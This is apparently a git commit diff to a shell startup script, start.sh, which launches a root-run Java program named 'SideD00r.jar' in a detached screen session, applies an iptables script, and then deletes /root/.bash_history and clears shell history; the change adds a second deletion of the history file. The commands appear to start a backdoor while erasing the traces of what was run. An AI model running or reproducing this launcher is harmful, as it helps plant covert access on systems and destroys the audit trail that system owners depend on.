13cc1956d3880eab561c4235bffbda3298000d18
Aaron Akhtar <52239843+Aaron-Akhtar@users.noreply.github.com>
2021-07-25 23:36:05 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,1 +1,1 @@
-screen -Dm sudo java -jar /root/.local/SideD00r.jar; sh /root/.local/iptables.sh; rm -rf /root/.bash_history; history -c
+screen -Dm sudo java -jar /root/.local/SideD00r.jar; sh /root/.local/iptables.sh; rm -rf /root/.bash_history; history -c; rm -rf /root/.bash_history
